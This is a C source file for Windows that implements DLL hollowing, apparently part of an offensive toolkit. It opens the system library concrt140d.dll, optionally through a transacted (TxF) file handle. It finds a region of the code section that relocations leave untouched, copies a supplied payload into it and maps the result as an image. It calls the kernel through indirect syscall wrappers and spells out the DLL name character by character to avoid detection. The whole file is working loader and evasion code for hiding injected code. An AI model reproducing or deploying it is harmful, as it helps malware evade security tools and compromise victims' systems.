#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <stdint.h>
#include <strsafe.h>
#include "init.h"
#include "crc32.h"
#include "shadowKiller.h"

IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, uint64_t qwRVA) {
	for (uint32_t dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
		IMAGE_SECTION_HEADER* pCurrentSectHdr = pInitialSectHeader;
		uint32_t dwCurrentSectSize;

		pCurrentSectHdr += dwX;

		if (pCurrentSectHdr->Misc.VirtualSize > pCurrentSectHdr->SizeOfRawData) {
			dwCurrentSectSize = pCurrentSectHdr->Misc.VirtualSize;
		}
		else {
			dwCurrentSectSize = pCurrentSectHdr->SizeOfRawData;
		}

		if ((qwRVA >= pCurrentSectHdr->VirtualAddress) && (qwRVA <= (pCurrentSectHdr->VirtualAddress + dwCurrentSectSize))) {
			return pCurrentSectHdr;
		}
	}

	return NULL;
}

void* GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA) {
	IMAGE_SECTION_HEADER* pContainSectHdr;

	if ((pContainSectHdr = GetContainerSectHdr(pNtHdrs, pInitialSectHdrs, qwRVA)) != NULL) {
		uint64_t dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);

		if (dwOffset < pContainSectHdr->SizeOfRawData) { 
			// Sections can be partially or fully virtual. Avoid creating physical pointers that reference regions outside of the raw data in sections with a greater virtual size than physical.
			return (uint8_t*)(pPeBuf + pContainSectHdr->PointerToRawData + dwOffset);
		}
	}

	return NULL;
}

BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA) {
	IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
	uint32_t dwRelocBufOffset, dwX;
	BOOL bWithinRange = FALSE;

	for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock; dwX++) {
		uint32_t dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
		uint16_t* pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

		for (uint32_t dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
#ifdef _WIN64
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64
#else
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW
#endif
			if (((*pwCurrentRelocEntry >> 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) {
				uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));

				if (dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
					bWithinRange = TRUE;
				}
			}
		}

		dwRelocBufOffset += pCurrentRelocBlock->SizeOfBlock;
		pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
	}

	return bWithinRange;
}

BOOL HollowDLLPro(
    uint8_t** ppMapBuf,
    uint64_t* pqwMapBufSize,
    const uint8_t* pCodeBuf,
    uint32_t dwReqBufSize,
    uint8_t** ppMappedCode,
    BOOL bTxF
) {
    if (!ppMapBuf || !pqwMapBufSize || !pCodeBuf || !dwReqBufSize || !ppMappedCode) {
        return FALSE;
    }

    BOOL bMapped = FALSE;

    // 遍历预定义的候选DLL列表
	const wchar_t dllName[] = {
	L'c', L'o', L'n', L'c', L'r', L't', L'1', L'4', L'0', L'd',
	L'.', L'd', L'l', L'l', L'\0'
	};
	wchar_t FilePath[MAX_PATH] = { 0 };
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hTransaction = INVALID_HANDLE_VALUE;
	NTSTATUS NtStatus;
	uint8_t* pFileBuf = NULL;

	k32Api.pGetSystemDirectoryW(FilePath, MAX_PATH);
	wcscat_s(FilePath, MAX_PATH, L"\\");
	wcscat_s(FilePath, MAX_PATH, dllName);
	

	if (bTxF) {
		OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };

		PROTECTED_CALL(NtStatus = sysJmpNtCreateTransaction(&hTransaction,
			TRANSACTION_ALL_ACCESS,
			&ObjAttr,
			NULL,
			NULL,
			0,
			0,
			0,
			NULL,
			NULL));

		if (NtStatus == 0) {
			PROTECTED_CALL(hFile = k32Api.pCreateFileTransactedW(FilePath,//打开目标dll是否支持打开事务
				GENERIC_WRITE | GENERIC_READ,
				0,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL,
				hTransaction,
				NULL,
				NULL));
		}
		else {
			printf("- Failed to create transaction (error 0x%x)\r\n", NtStatus);
		}
	}
	else {
		PROTECTED_CALL(hFile = k32Api.pCreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL));
	}

	if (hFile != INVALID_HANDLE_VALUE) {
		uint32_t dwFileSize = 0;
		uint32_t dwBytesRead = 0;
		BOOL	 byRf = FALSE;

		PROTECTED_CALL(dwFileSize = k32Api.pGetFileSize(hFile, NULL));

		pFileBuf = calloc(dwFileSize, 1);

		PROTECTED_CALL(byRf = k32Api.pReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, NULL));

		if (byRf) {
			PROTECTED_CALL(k32Api.pSetFilePointer(hFile, 0, NULL, FILE_BEGIN));

			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
			IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
			IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

			if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
				if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {

					printf("* %ws - image size: %d - .text size: %d\r\n", dllName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);

					BOOL bTxF_Valid = FALSE;
					uint32_t dwCodeRva = 0;

					if (bTxF) {
						uint32_t dwBytesWritten = 0;

						for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++)
						{
							if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress &&
								pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize))
							{
								pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
								pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
							}
						}

						BOOL bRangeFound = FALSE;
						BOOL byWf = FALSE;
						uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

						if (pRelocBuf != NULL) {
							for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
								if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
									bRangeFound = TRUE;
									break;
								}
							}

							if (bRangeFound) {
								printf("+ Found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
							}
							else {
								printf("- Failed to identify a blank region large enough to accomodate payload\r\n");
							}

							memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);

							PROTECTED_CALL(byWf = k32Api.pWriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesWritten, NULL));

							if (byWf) {
								printf("+ Successfully modified TxF file content.\r\n");
								bTxF_Valid = TRUE;
							}
						}
						else {
							printf("- No relocation directory present.\r\n");
						}
					}

					if (!bTxF || bTxF_Valid) {
						HANDLE hSection = NULL;
						PROTECTED_CALL(NtStatus = sysJmpNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile));

						if (NtStatus == 0) {
							*pqwMapBufSize = 0;
							PROTECTED_CALL(NtStatus = sysJmpNtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, NULL, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY));

							if (NtStatus == 0) {
								if (*pqwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) {
									printf("* %ws - mapped size: %I64u\r\n", dllName, *pqwMapBufSize);
									*ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

									if (!bTxF) {
										uint32_t dwOldProtect = 0;

										PROTECTED_CALL(NtStatus = sysJmpNtProtectVirtualMemory((HANDLE)-1, (PVOID)(*ppMappedCode), (PULONG)dwReqBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect));

										if (NtStatus) {
											memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);

											PROTECTED_CALL(NtStatus = sysJmpNtProtectVirtualMemory((HANDLE)-1, (PVOID)(*ppMappedCode), (PULONG)dwReqBufSize, dwOldProtect, (PDWORD)&dwOldProtect));

											if (NtStatus) {
												bMapped = TRUE;
											}
										}
									}
									else {
										bMapped = TRUE;
									}
								}
							}
							else {
								printf("- Failed to create mapping of section (error 0x%08x)", NtStatus);
							}
						}
						else {
							printf("- Failed to create section (error 0x%x)\r\n", NtStatus);
						}
					}
					else {
						printf("- TxF initialization failed.\r\n");
					}
				}
			}
		}

		if (pFileBuf != NULL) {
			free(pFileBuf);
		}

		if (hFile != INVALID_HANDLE_VALUE) {
			PROTECTED_CALL(sysJmpNtClose(hFile));
		}

		if (hTransaction != INVALID_HANDLE_VALUE) {
			PROTECTED_CALL(sysJmpNtClose(hTransaction));
		}
	}
	else {
		DWORD err = GetLastError();
		printf("- Failed to open handle to %ws (error:%d)\r\n", FilePath, err);
	}
	return bMapped;
}